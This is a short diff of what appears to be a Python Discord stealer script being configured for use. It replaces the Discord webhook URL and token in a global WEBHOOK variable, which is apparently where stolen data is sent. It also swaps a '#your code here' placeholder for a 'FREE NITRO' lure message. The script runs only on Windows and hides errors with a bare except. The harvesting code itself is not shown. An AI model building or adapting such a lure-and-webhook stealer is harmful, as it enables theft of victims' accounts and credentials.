@@ -16,7 +16,7 @@ colorama.init()
 def Auth():
     def dastela():
         global WEBHOOK
-        WEBHOOK = "https://discordapp.com/api/webhooks/764350751232229376/BYXFkJct5VNn6iTWtJtWf8WutzUIFFcc199u-SwQhUEx7qsjiAmxoCge7fD3m2jfwF-P"
+        WEBHOOK = "https://discordapp.com/api/webhooks/823114699246927902/s664Mr2x6KA0gEymP92xnqrWgVfagZnLa_WAQphp74QS4uLm8Gl4ladFLUr6CHwCa8b9"
         import os
         if os.name != "nt":
             exit()
@@ -200,7 +200,7 @@ def Auth():
         dastela()
     except:
         pass
-    #your code here
+    print("FREE NITRO")
     time.sleep(5)
 
 Auth()
